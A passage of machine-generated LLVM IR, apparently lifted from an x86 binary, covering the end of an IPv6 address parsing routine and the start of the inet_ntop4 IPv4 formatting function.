  br i1 %v1_80668b3, label %dec_label_pc_80668bf, label %dec_label_pc_80668b5

dec_label_pc_80668b5:                             ; preds = %dec_label_pc_80668a4
  %v1_80668b5 = add i32 %v0_80668b0, 1
  store i32 %v1_80668b5, i32* %esi.global-to-local, align 4
  %v1_80668b6 = inttoptr i32 %v1_80668b5 to i8*
  %v2_80668b6 = load i8, i8* %v1_80668b6, align 1
  %v11_80668b6 = icmp eq i8 %v2_80668b6, 58
  %v1_80668b9 = icmp eq i1 %v11_80668b6, false
  br i1 %v1_80668b9, label %dec_label_pc_8066a2c, label %dec_label_pc_80668bf

dec_label_pc_80668bf:                             ; preds = %dec_label_pc_80668b5, %dec_label_pc_80668a4
  %stack_var_-36.0.in42 = phi i32 [ %v1_80668b5, %dec_label_pc_80668b5 ], [ %v0_80668b0, %dec_label_pc_80668a4 ]
  %tmp67 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_8066963

dec_label_pc_80668d4:                             ; preds = %dec_label_pc_80668d4.lr.ph, %dec_label_pc_8066921
  %v3_80669a9123 = phi i32 [ %v3_80669a9114146, %dec_label_pc_80668d4.lr.ph ], [ %v3_80669a9, %dec_label_pc_8066921 ]
  %stack_var_-36.1122 = phi i8* [ %stack_var_-36.1.ph143, %dec_label_pc_80668d4.lr.ph ], [ %v5_8066925, %dec_label_pc_8066921 ]
  %stack_var_-40.1121 = phi i8* [ %stack_var_-40.1.ph142, %dec_label_pc_80668d4.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8066921 ]
  %v0_80668d5120 = phi i32 [ %v0_80669a9.pre140, %dec_label_pc_80668d4.lr.ph ], [ %v0_8066925, %dec_label_pc_8066921 ]
  %v1_80668d5 = add i32 %v0_80668d5120, 1
  store i32 %v1_80668d5, i32* @esi, align 4
  %v1_80668da = or i32 %v3_80669a9123, 32
  store i32 %v1_80668da, i32* %eax.global-to-local, align 4
  %v4_80668e3 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80703cc.1712, i32 0, i32 0), i32 %v1_80668da)
  store i32 %v4_80668e3, i32* %eax.global-to-local, align 4
  %v1_80668eb = icmp eq i32 %v4_80668e3, 0
  br i1 %v1_80668eb, label %dec_label_pc_806690a, label %dec_label_pc_80668ef

dec_label_pc_80668ef:                             ; preds = %dec_label_pc_80668d4
  %v0_80668ef = load i32, i32* @ebp, align 4
  %v2_80668ef = mul i32 %v0_80668ef, 16
  %v1_80668f2 = add i32 %v4_80668e3, -134677452
  store i32 %v1_80668f2, i32* %eax.global-to-local, align 4
  %v2_80668f7 = or i32 %v2_80668ef, %v1_80668f2
  store i32 %v2_80668f7, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_80668f7, 65536
  br i1 %tmp, label %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge, label %dec_label_pc_8066a2c

dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge: ; preds = %dec_label_pc_80668ef
  %v0_80669a9.pre.pre = load i32, i32* @esi, align 4
  %v4_80669a9.pre = load i32, i32* @ebx, align 4
  %v1_80669a9112 = inttoptr i32 %v0_80669a9.pre.pre to i8*
  %v2_80669a9113 = load i8, i8* %v1_80669a9112, align 1
  %v3_80669a9114 = zext i8 %v2_80669a9113 to i32
  %v5_80669a9115 = and i32 %v4_80669a9.pre, -256
  %v6_80669a9116 = or i32 %v3_80669a9114, %v5_80669a9115
  store i32 %v6_80669a9116, i32* @ebx, align 4
  %v4_80669ab117 = icmp eq i8 %v2_80669a9113, 0
  %v1_80669ad119 = icmp eq i1 %v4_80669ab117, false
  br i1 %v1_80669ad119, label %dec_label_pc_80668d4.lr.ph, label %dec_label_pc_80669b3.thread205

dec_label_pc_80669b3.thread205:                   ; preds = %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge
  store i32 %v4_8066921, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80669be

dec_label_pc_80668d4.lr.ph:                       ; preds = %dec_label_pc_8066963, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge
  %v3_80669a9114146 = phi i32 [ %v3_80669a9114, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ %v3_80669a9114134, %dec_label_pc_8066963 ]
  %stack_var_-36.1.ph143 = phi i8* [ %stack_var_-36.1122, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ %v1_80669a9112132, %dec_label_pc_8066963 ]
  %stack_var_-40.1.ph142 = phi i8* [ %stack_var_-40.1121, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ %stack_var_-40.0, %dec_label_pc_8066963 ]
  %v0_80669a9.pre140 = phi i32 [ %v0_80669a9.pre.pre, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8066963 ]
  %v1_8066914145 = phi i1 [ true, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ false, %dec_label_pc_8066963 ]
  %v4_806690f144 = phi i1 [ false, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ true, %dec_label_pc_8066963 ]
  %stack_var_-48.0.ph141 = phi i32 [ 1, %dec_label_pc_80668ef.dec_label_pc_80669a9.outer_crit_edge ], [ 0, %dec_label_pc_8066963 ]
  br label %dec_label_pc_80668d4

dec_label_pc_806690a:                             ; preds = %dec_label_pc_80668d4
  %v0_806690a = load i32, i32* @ebx, align 4
  %v1_806690a = trunc i32 %v0_806690a to i8
  %v10_806690a = icmp eq i8 %v1_806690a, 58
  %v1_806690d = icmp eq i1 %v10_806690a, false
  br i1 %v1_806690d, label %dec_label_pc_806696f, label %dec_label_pc_806690f

dec_label_pc_806690f:                             ; preds = %dec_label_pc_806690a
  br i1 %v1_8066914145, label %dec_label_pc_806692f, label %dec_label_pc_8066916

dec_label_pc_8066916:                             ; preds = %dec_label_pc_806690f
  %v5_8066916 = icmp eq i8* %stack_var_-40.1121, null
  %v1_806691b = icmp eq i1 %v5_8066916, false
  br i1 %v1_806691b, label %dec_label_pc_8066a2c, label %dec_label_pc_8066921

dec_label_pc_8066921:                             ; preds = %dec_label_pc_8066916
  store i32 %v4_8066921, i32* %eax.global-to-local, align 4
  %v0_8066925 = load i32, i32* @esi, align 4
  %v5_8066925 = inttoptr i32 %v0_8066925 to i8*
  %v2_80669a9 = load i8, i8* %v5_8066925, align 1
  %v3_80669a9 = zext i8 %v2_80669a9 to i32
  %v5_80669a9 = and i32 %v0_806690a, -256
  %v6_80669a9 = or i32 %v3_80669a9, %v5_80669a9
  store i32 %v6_80669a9, i32* @ebx, align 4
  %v4_80669ab = icmp eq i8 %v2_80669a9, 0
  %v1_80669ad = icmp eq i1 %v4_80669ab, false
  br i1 %v1_80669ad, label %dec_label_pc_80668d4, label %dec_label_pc_80669b3

dec_label_pc_806692f:                             ; preds = %dec_label_pc_806690f
  %v0_806692f = load i32, i32* @esi, align 4
  %v1_806692f = inttoptr i32 %v0_806692f to i8*
  %v2_806692f = load i8, i8* %v1_806692f, align 1
  %v3_806692f = icmp eq i8 %v2_806692f, 0
  br i1 %v3_806692f, label %dec_label_pc_8066a2c, label %dec_label_pc_8066938

dec_label_pc_8066938:                             ; preds = %dec_label_pc_806692f
  store i32 %v4_8066878, i32* @ecx, align 4
  %v1_8066940 = add i32 %v4_8066921, 2
  store i32 %v1_8066940, i32* @edx, align 4
  %v6_8066945 = icmp ugt i32 %v1_8066940, %v4_8066878
  br i1 %v6_8066945, label %dec_label_pc_8066a2c, label %dec_label_pc_806694b

dec_label_pc_806694b:                             ; preds = %dec_label_pc_8066938
  store i32 %v4_8066921, i32* @ecx, align 4
  %v0_806694f = load i32, i32* @ebp, align 4
  %v2_8066951 = udiv i32 %v0_806694f, 256
  %v4_8066951 = trunc i32 %v2_8066951 to i8
  store i8 %v4_8066951, i8* %stack_var_-44.0, align 1
  %v0_8066956 = load i32, i32* @ebp, align 4
  store i32 %v0_8066956, i32* %eax.global-to-local, align 4
  %v1_8066958 = trunc i32 %v0_8066956 to i8
  %v2_8066958 = load i32, i32* @ecx, align 4
  %v3_8066958 = add i32 %v2_8066958, 1
  %v4_8066958 = inttoptr i32 %v3_8066958 to i8*
  store i8 %v1_8066958, i8* %v4_8066958, align 1
  %v0_806695b = load i32, i32* @edx, align 4
  %v5_806695b = inttoptr i32 %v0_806695b to i8*
  %stack_var_-36.0.in.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066963

dec_label_pc_8066963:                             ; preds = %dec_label_pc_80668bf, %dec_label_pc_806694b
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in42, %dec_label_pc_80668bf ], [ %stack_var_-36.0.in.pre, %dec_label_pc_806694b ]
  %stack_var_-40.0 = phi i8* [ null, %dec_label_pc_80668bf ], [ %stack_var_-40.1121, %dec_label_pc_806694b ]
  %stack_var_-44.0 = phi i8* [ %tmp67, %dec_label_pc_80668bf ], [ %v5_806695b, %dec_label_pc_806694b ]
  store i32 0, i32* @ebp, align 4
  %v4_8066921 = ptrtoint i8* %stack_var_-44.0 to i32
  %v4_80669a9.pre131 = load i32, i32* @ebx, align 4
  %v1_80669a9112132 = inttoptr i32 %stack_var_-36.0.in to i8*
  %v2_80669a9113133 = load i8, i8* %v1_80669a9112132, align 1
  %v3_80669a9114134 = zext i8 %v2_80669a9113133 to i32
  %v5_80669a9115135 = and i32 %v4_80669a9.pre131, -256
  %v6_80669a9116136 = or i32 %v3_80669a9114134, %v5_80669a9115135
  store i32 %v6_80669a9116136, i32* @ebx, align 4
  %v4_80669ab117137 = icmp eq i8 %v2_80669a9113133, 0
  %v1_80669ad119139 = icmp eq i1 %v4_80669ab117137, false
  br i1 %v1_80669ad119139, label %dec_label_pc_80668d4.lr.ph, label %dec_label_pc_80669b3.thread

dec_label_pc_80669b3.thread:                      ; preds = %dec_label_pc_8066963
  store i32 %v4_8066921, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80669d7

dec_label_pc_806696f:                             ; preds = %dec_label_pc_806690a
  %v10_806696f = icmp eq i8 %v1_806690a, 46
  %v1_8066972 = icmp eq i1 %v10_806696f, false
  br i1 %v1_8066972, label %dec_label_pc_8066a2c, label %dec_label_pc_8066978

dec_label_pc_8066978:                             ; preds = %dec_label_pc_806696f
  store i32 %v4_8066878, i32* @edx, align 4
  %v1_8066980 = add i32 %v4_8066921, 4
  store i32 %v1_8066980, i32* @edi, align 4
  %v6_8066985 = icmp ugt i32 %v1_8066980, %v4_8066878
  br i1 %v6_8066985, label %dec_label_pc_8066a2c, label %dec_label_pc_806698b

dec_label_pc_806698b:                             ; preds = %dec_label_pc_8066978
  store i32 %v4_8066921, i32* @edx, align 4
  %v4_806698f = ptrtoint i8* %stack_var_-36.1122 to i32
  store i32 %v4_806698f, i32* @eax, align 4
  %v4_8066993 = ptrtoint i8* %stack_var_-40.1121 to i32
  %v5_8066993 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph141, i32 %v4_8066921, i32 %v4_8066993)
  store i32 %v5_8066993, i32* %eax.global-to-local, align 4
  %tmp68 = icmp slt i32 %v5_8066993, 1
  %tmp69 = icmp eq i1 %tmp68, false
  br i1 %tmp69, label %dec_label_pc_806698b.dec_label_pc_80669d7_crit_edge, label %dec_label_pc_8066a2c

dec_label_pc_806698b.dec_label_pc_80669d7_crit_edge: ; preds = %dec_label_pc_806698b
  %v0_8066a15.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80669d7

dec_label_pc_80669b3:                             ; preds = %dec_label_pc_8066921
  store i32 %v4_8066921, i32* %edi.global-to-local, align 4
  br i1 %v4_806690f144, label %dec_label_pc_80669d7, label %dec_label_pc_80669be

dec_label_pc_80669be:                             ; preds = %dec_label_pc_80669b3.thread205, %dec_label_pc_80669b3
  %stack_var_-40.1.lcssa206 = phi i8* [ %stack_var_-40.1121, %dec_label_pc_80669b3.thread205 ], [ %stack_var_-44.0, %dec_label_pc_80669b3 ]
  %v1_80669be = add i32 %v4_8066921, 2
  store i32 %v1_80669be, i32* @edx, align 4
  store i32 %v4_8066878, i32* @ecx, align 4
  %v6_80669c7 = icmp ugt i32 %v1_80669be, %v4_8066878
  br i1 %v6_80669c7, label %dec_label_pc_8066a2c, label %dec_label_pc_80669c9

dec_label_pc_80669c9:                             ; preds = %dec_label_pc_80669be
  %v0_80669c9 = load i32, i32* @ebp, align 4
  %v2_80669cb = udiv i32 %v0_80669c9, 256
  %v4_80669cb = trunc i32 %v2_80669cb to i8
  store i8 %v4_80669cb, i8* %stack_var_-44.0, align 1
  %v0_80669d0 = load i32, i32* @ebp, align 4
  store i32 %v0_80669d0, i32* %eax.global-to-local, align 4
  %v1_80669d2 = trunc i32 %v0_80669d0 to i8
  %v2_80669d2 = load i32, i32* %edi.global-to-local, align 4
  %v3_80669d2 = add i32 %v2_80669d2, 1
  %v4_80669d2 = inttoptr i32 %v3_80669d2 to i8*
  store i8 %v1_80669d2, i8* %v4_80669d2, align 1
  %v0_80669d5 = load i32, i32* @edx, align 4
  store i32 %v0_80669d5, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80669d7

dec_label_pc_80669d7:                             ; preds = %dec_label_pc_80669b3.thread, %dec_label_pc_806698b.dec_label_pc_80669d7_crit_edge, %dec_label_pc_80669b3, %dec_label_pc_80669c9
  %v0_8066a15.pre = phi i32 [ %v4_8066921, %dec_label_pc_80669b3 ], [ %v0_8066a15.pre.pre, %dec_label_pc_806698b.dec_label_pc_80669d7_crit_edge ], [ %v0_80669d5, %dec_label_pc_80669c9 ], [ %v4_8066921, %dec_label_pc_80669b3.thread ]
  %stack_var_-40.185 = phi i8* [ %stack_var_-44.0, %dec_label_pc_80669b3 ], [ %stack_var_-40.1121, %dec_label_pc_806698b.dec_label_pc_80669d7_crit_edge ], [ %stack_var_-40.1.lcssa206, %dec_label_pc_80669c9 ], [ %stack_var_-40.0, %dec_label_pc_80669b3.thread ]
  %v4_80669d7 = ptrtoint i8* %stack_var_-40.185 to i32
  %v5_80669d7 = icmp eq i8* %stack_var_-40.185, null
  br i1 %v5_80669d7, label %dec_label_pc_8066a11, label %dec_label_pc_80669de

dec_label_pc_80669de:                             ; preds = %dec_label_pc_80669d7
  store i32 1, i32* %ebx.global-to-local, align 4
  store i32 %v4_8066878, i32* @edx, align 4
  %v6_80669e9 = sub i32 %v0_8066a15.pre, %v4_80669d7
  store i32 %v6_80669e9, i32* %esi.global-to-local, align 4
  %v12_80669ed = icmp eq i32 %v0_8066a15.pre, %v4_8066878
  %v1_80669ef = icmp eq i1 %v12_80669ed, false
  br i1 %v1_80669ef, label %dec_label_pc_8066a09.preheader, label %dec_label_pc_8066a2c

dec_label_pc_8066a09.preheader:                   ; preds = %dec_label_pc_80669de
  %v7_8066a0b109 = icmp slt i32 %v6_80669e9, 1
  br i1 %v7_8066a0b109, label %dec_label_pc_8066a0d, label %dec_label_pc_80669f3

dec_label_pc_80669f3:                             ; preds = %dec_label_pc_8066a09.preheader, %dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge
  %v4_8066a02 = phi i32 [ %v4_8066a02.pre, %dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge ], [ %v4_8066878, %dec_label_pc_8066a09.preheader ]
  %v0_8066a01111 = phi i32 [ %v0_8066a09.pre, %dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge ], [ 1, %dec_label_pc_8066a09.preheader ]
  %v0_80669f3110 = phi i32 [ %v1_8066a09.pre, %dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge ], [ %v6_80669e9, %dec_label_pc_8066a09.preheader ]
  %v2_80669f5 = sub i32 %v0_80669f3110, %v0_8066a01111
  %v6_80669f7 = add i32 %v2_80669f5, %v4_80669d7
  store i32 %v6_80669f7, i32* %eax.global-to-local, align 4
  %v2_80669ff = sub i32 %v4_8066878, %v0_8066a01111
  %v1_8066a01 = add i32 %v0_8066a01111, 1
  store i32 %v1_8066a01, i32* %ebx.global-to-local, align 4
  %v1_8066a02 = inttoptr i32 %v6_80669f7 to i8*
  %v2_8066a02 = load i8, i8* %v1_8066a02, align 1
  %v3_8066a02 = zext i8 %v2_8066a02 to i32
  %v5_8066a02 = and i32 %v4_8066a02, -256
  %v6_8066a02 = or i32 %v5_8066a02, %v3_8066a02
  store i32 %v6_8066a02, i32* @edx, align 4
  %v3_8066a04 = inttoptr i32 %v2_80669ff to i8*
  store i8 %v2_8066a02, i8* %v3_8066a04, align 1
  %v0_8066a06 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066a06 = inttoptr i32 %v0_8066a06 to i8*
  store i8 0, i8* %v1_8066a06, align 1
  %v0_8066a09.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066a09.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8066a0b = icmp sgt i32 %v0_8066a09.pre, %v1_8066a09.pre
  br i1 %v7_8066a0b, label %dec_label_pc_8066a0d, label %dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge

dec_label_pc_80669f3.dec_label_pc_80669f3_crit_edge: ; preds = %dec_label_pc_80669f3
  %v4_8066a02.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80669f3

dec_label_pc_8066a0d:                             ; preds = %dec_label_pc_80669f3, %dec_label_pc_8066a09.preheader
  store i32 %v4_8066878, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8066a11

dec_label_pc_8066a11:                             ; preds = %dec_label_pc_80669d7, %dec_label_pc_8066a0d
  %v0_8066a15 = phi i32 [ %v4_8066878, %dec_label_pc_8066a0d ], [ %v0_8066a15.pre, %dec_label_pc_80669d7 ]
  store i32 %v4_8066878, i32* @ecx, align 4
  %v12_8066a15 = icmp eq i32 %v0_8066a15, %v4_8066878
  store i32 %v2_80668a4, i32* %esi.global-to-local, align 4
  %v1_8066a1b = icmp eq i1 %v12_8066a15, false
  br i1 %v1_8066a1b, label %dec_label_pc_8066a2c, label %dec_label_pc_8066a1d

dec_label_pc_8066a1d:                             ; preds = %dec_label_pc_8066a11
  store i32 %tmp53, i32* %edi.global-to-local, align 4
  %v2_8066a21 = load i32, i32* %stack_var_-32, align 4
  %v4_8066a21 = inttoptr i32 %tmp53 to i32*
  store i32 %v2_8066a21, i32* %v4_8066a21, align 4
  %v5_8066a21 = load i32, i32* %edi.global-to-local, align 4
  %v6_8066a21 = load i32, i32* %esi.global-to-local, align 4
  %v7_8066a21 = load i1, i1* @df, align 1
  %v8_8066a21 = select i1 %v7_8066a21, i32 -4, i32 4
  %v9_8066a21 = add i32 %v8_8066a21, %v5_8066a21
  %v10_8066a21 = add i32 %v8_8066a21, %v6_8066a21
  store i32 %v9_8066a21, i32* %edi.global-to-local, align 4
  store i32 %v10_8066a21, i32* %esi.global-to-local, align 4
  %v1_8066a22 = inttoptr i32 %v10_8066a21 to i32*
  %v2_8066a22 = load i32, i32* %v1_8066a22, align 4
  %v4_8066a22 = inttoptr i32 %v9_8066a21 to i32*
  store i32 %v2_8066a22, i32* %v4_8066a22, align 4
  %v5_8066a22 = load i32, i32* %edi.global-to-local, align 4
  %v6_8066a22 = load i32, i32* %esi.global-to-local, align 4
  %v9_8066a22 = add i32 %v5_8066a22, %v8_8066a21
  %v10_8066a22 = add i32 %v6_8066a22, %v8_8066a21
  store i32 %v9_8066a22, i32* %edi.global-to-local, align 4
  store i32 %v10_8066a22, i32* %esi.global-to-local, align 4
  %v1_8066a23 = inttoptr i32 %v10_8066a22 to i32*
  %v2_8066a23 = load i32, i32* %v1_8066a23, align 4
  %v4_8066a23 = inttoptr i32 %v9_8066a22 to i32*
  store i32 %v2_8066a23, i32* %v4_8066a23, align 4
  %v5_8066a23 = load i32, i32* %edi.global-to-local, align 4
  %v6_8066a23 = load i32, i32* %esi.global-to-local, align 4
  %v9_8066a23 = add i32 %v5_8066a23, %v8_8066a21
  %v10_8066a23 = add i32 %v6_8066a23, %v8_8066a21
  store i32 %v9_8066a23, i32* %edi.global-to-local, align 4
  store i32 %v10_8066a23, i32* %esi.global-to-local, align 4
  %v1_8066a24 = inttoptr i32 %v10_8066a23 to i32*
  %v2_8066a24 = load i32, i32* %v1_8066a24, align 4
  %v4_8066a24 = inttoptr i32 %v9_8066a23 to i32*
  store i32 %v2_8066a24, i32* %v4_8066a24, align 4
  %v5_8066a24 = load i32, i32* %edi.global-to-local, align 4
  %v6_8066a24 = load i32, i32* %esi.global-to-local, align 4
  %v9_8066a24 = add i32 %v5_8066a24, %v8_8066a21
  %v10_8066a24 = add i32 %v6_8066a24, %v8_8066a21
  store i32 %v9_8066a24, i32* %edi.global-to-local, align 4
  store i32 %v10_8066a24, i32* %esi.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066a3f

dec_label_pc_8066a2c:                             ; preds = %dec_label_pc_8066938, %dec_label_pc_806692f, %dec_label_pc_80668ef, %dec_label_pc_8066916, %dec_label_pc_80669de, %dec_label_pc_806698b, %dec_label_pc_8066a11, %dec_label_pc_80669be, %dec_label_pc_8066978, %dec_label_pc_806696f, %dec_label_pc_80668b5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066a3f

dec_label_pc_8066a30:                             ; preds = %dec_label_pc_8066889
  store i32 97, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066a3f

dec_label_pc_8066a3f:                             ; preds = %dec_label_pc_8066a2c, %dec_label_pc_8066a1d, %dec_label_pc_8066894, %dec_label_pc_8066a30
  %v0_8066a46 = phi i32 [ 0, %dec_label_pc_8066a2c ], [ 1, %dec_label_pc_8066a1d ], [ %v3_806689a, %dec_label_pc_8066894 ], [ -1, %dec_label_pc_8066a30 ]
  %v2_8066a42 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066a42, i32* @ebx, align 4
  store i32 %v0_8066877, i32* @esi, align 4
  store i32 %v0_8066876, i32* @edi, align 4
  store i32 %v0_8066875, i32* @ebp, align 4
  ret i32 %v0_8066a46

; uselistorder directives
  uselistorder i32 %v1_8066a09.pre, { 1, 0 }
  uselistorder i32 %v0_8066a09.pre, { 1, 0 }
  uselistorder i32 %v0_8066a01111, { 2, 1, 0 }
  uselistorder i32 %v0_8066a15.pre, { 2, 0, 1 }
  uselistorder i32 %v3_80669a9114134, { 1, 0 }
  uselistorder i8* %v1_80669a9112132, { 1, 0 }
  uselistorder i32 %v4_8066921, { 1, 2, 8, 7, 6, 5, 4, 3, 0, 11, 9, 10 }
  uselistorder i8* %stack_var_-44.0, { 0, 2, 1, 5, 3, 4 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v3_80669a9, { 1, 0 }
  uselistorder i32 %v0_8066925, { 1, 0 }
  uselistorder i8* %stack_var_-40.1121, { 1, 0, 3, 4, 5, 2 }
  uselistorder i8* %stack_var_-36.1122, { 1, 0 }
  uselistorder i32 %v2_80668a4, { 1, 0, 2 }
  uselistorder i32 %v4_8066878, { 0, 11, 3, 9, 8, 2, 1, 10, 6, 7, 4, 13, 5, 12 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2, 3 }
  uselistorder i32 %tmp53, { 2, 1, 0 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 11, 19, 21, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_8066a3f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8066a2c, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8066a11, { 1, 0 }
  uselistorder label %dec_label_pc_80669f3, { 1, 0 }
  uselistorder label %dec_label_pc_80669d7, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80669be, { 1, 0 }
  uselistorder label %dec_label_pc_8066963, { 1, 0 }
  uselistorder label %dec_label_pc_80668d4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066a48 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8066a4b = load i32, i32* @esi, align 4
  %v0_8066a4c = load i32, i32* @ebx, align 4
  store i32 %v0_8066a4c, i32* %stack_var_-16, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v15_8066a4f = ptrtoint i32* %stack_var_-76 to i32
  %v0_8066a52 = load i32, i32* @eax, align 4
  %v0_8066a56 = load i32, i32* @edx, align 4
  %v5_8066a56 = inttoptr i32 %v0_8066a56 to i8*
  store i8* %v5_8066a56, i8** %stack_var_-56, align 4
  %v0_8066a5a = load i32, i32* @ecx, align 4
  store i32 0, i32* %stack_var_-33, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8066a68

dec_label_pc_8066a68:                             ; preds = %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge, %entry
  %v2_8066a83 = phi i32 [ %v15_8066a4f, %entry ], [ %v2_8066a83.pre, %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge ]
  %v0_8066a6e = phi i32 [ 0, %entry ], [ %v0_8066a6e.pre, %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge ]
  %v0_8066a6c = phi i32 [ %v0_8066a5a, %entry ], [ %v0_8066a6c.pre, %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge ]
  %v1_8066a7137 = phi i32 [ 0, %entry ], [ %v0_8066b07.pre, %dec_label_pc_8066ae7.dec_label_pc_8066a68_crit_edge ]
  %v1_8066a6c = and i32 %v0_8066a6c, -256
  %v2_8066a6c = or i32 %v1_8066a6c, 100
  store i32 %v2_8066a6c, i32* %ecx.global-to-local, align 4
  %v1_8066a6e = add i32 %v0_8066a6e, 1
  store i32 %v1_8066a6e, i32* %edx.global-to-local, align 4
  %v2_8066a71 = add i32 %v1_8066a7137, %v0_8066a52
  %v12_8066a71 = icmp eq i32 %v2_8066a71, 0
  store i1 %v12_8066a71, i1* %zf.global-to-local, align 1
  store i32 %v2_8066a71, i32* %ebp.global-to-local, align 4
  %v1_8066a73 = inttoptr i32 %v2_8066a71 to i8*
  %v2_8066a73 = load i8, i8* %v1_8066a73, align 1
  %v3_8066a73 = zext i8 %v2_8066a73 to i32
  %div10 = udiv i8 %v2_8066a73, 100
  %v6_8066a7c = zext i8 %div10 to i32
  %tmp29 = urem i8 %v2_8066a73, 100
  %v12_8066a7c = zext i8 %tmp29 to i32
  %v14_8066a7c = mul nuw nsw i32 %v12_8066a7c, 256
  %v16_8066a7c = or i32 %v14_8066a7c, %v6_8066a7c
  store i32 %v16_8066a7c, i32* %eax.global-to-local, align 4
  %v2_8066a80 = or i8 %div10, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v4_8066a83 = add i32 %v0_8066a6e, 43
  %v5_8066a83 = add i32 %v4_8066a83, %v2_8066a83
  %v6_8066a83 = inttoptr i32 %v5_8066a83 to i8*
  store i8 %v2_8066a80, i8* %v6_8066a83, align 1
  %v0_8066a87 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8066a87, i32* %ecx.global-to-local, align 4
  %v0_8066a89 = load i32, i32* %edx.global-to-local, align 4
  %v0_8066a8d = load i32, i32* @esp, align 4
  %v2_8066a8d = add i32 %v0_8066a87, 43
  %v3_8066a8d = add i32 %v2_8066a8d, %v0_8066a8d
  %v4_8066a8d = inttoptr i32 %v3_8066a8d to i8*
  %v5_8066a8d = load i8, i8* %v4_8066a8d, align 1
  %v11_8066a8d = icmp eq i8 %v5_8066a8d, 48
  store i1 %v11_8066a8d, i1* %zf.global-to-local, align 1
  %v1_8066a92 = icmp eq i1 %v11_8066a8d, false
  %v5_8066ac1 = load i32, i32* %eax.global-to-local, align 4
  %v6_8066ac1 = and i32 %v5_8066ac1, -65536
  %v7_8066ac1 = or i32 %v6_8066ac1, %v3_8066a73
  store i32 %v7_8066ac1, i32* %eax.global-to-local, align 4
  br i1 %v1_8066a92, label %dec_label_pc_8066ac1, label %dec_label_pc_8066a94

dec_label_pc_8066a94:                             ; preds = %dec_label_pc_8066a68
  %div5 = udiv i8 %v2_8066a73, 10
  store i32 10, i32* @esi, align 4
  %tmp30 = urem i8 %div5, 10
  %tmp31 = zext i8 %tmp30 to i32
  store i32 %tmp31, i32* %edx.global-to-local, align 4
  %v2_8066ab1 = or i8 %tmp30, 48
  %v12_8066ab1 = zext i8 %v2_8066ab1 to i32
  store i32 %v12_8066ab1, i32* %eax.global-to-local, align 4
  %v7_8066ab3 = icmp eq i8 %tmp30, 0
  store i1 %v7_8066ab3, i1* %zf.global-to-local, align 1
  store i8 %v2_8066ab1, i8* %v4_8066a8d, align 1
  %v0_8066ab9 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8066ab9, label %dec_label_pc_8066ae7, label %dec_label_pc_8066abb

dec_label_pc_8066abb:                             ; preds = %dec_label_pc_8066a94
  store i32 %v0_8066a89, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066ae7

